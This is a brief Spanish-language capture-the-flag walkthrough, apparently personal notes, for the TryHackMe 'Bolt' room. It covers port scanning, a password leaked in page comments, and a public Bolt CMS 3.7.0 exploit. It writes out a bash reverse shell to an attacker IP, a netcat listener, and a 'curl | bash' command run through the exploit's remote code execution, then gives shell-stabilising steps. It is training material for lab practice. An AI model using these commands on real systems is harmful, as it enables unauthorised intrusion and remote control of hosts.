https://tryhackme.com/r/room/bolt
# Fase de reconocimiento
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.113.97
```
![[Pasted image 20240602022525.png]]
## Reconocimiento de servicios
```
nmap -sCV -p22,80,8000 10.10.113.97
```
![[Pasted image 20240602022643.png]]
## Fuzzing
![[Pasted image 20240602023315.png]]

Password in comments (Hyperealistic)
![[Pasted image 20240602023345.png]]
![[Pasted image 20240602024537.png]]
Nos logueamos con la contraseña vista
![[Pasted image 20240602024626.png]]
## Buscar vulnerabilidades
```
searchsploit bolt 3.7.0
```
![[Pasted image 20240602025525.png]]
# Fase de ataque
Traemos el exploit
```
searchsploit -m php/webapps/48296.py
```
![[Pasted image 20240602025948.png]]
1. Nos ponemos en escucha
```
nc -nlvp 443
```
2. Creamos un archivo.html con la shell
```
#!/bin/bash

bash -i >& /dev/tcp/10.9.0.36/443 0>&1
```
3. Creamos una web para alojar el archivo
```
python3 -m http.server 80
```
4. En el RCE eejuctamos el archivo
```
curl http://10.9.0.36/archivo.html | bash
```
[+] ==pwned!==
## Ajustar terminal
```
script /dev/null -c bash
```
ctrl + z
```
stty raw -echo; fg
```
```
	reset xterm
```
```
export TERM=xterm
```

Find flag
```
find / -name flag.txt
```
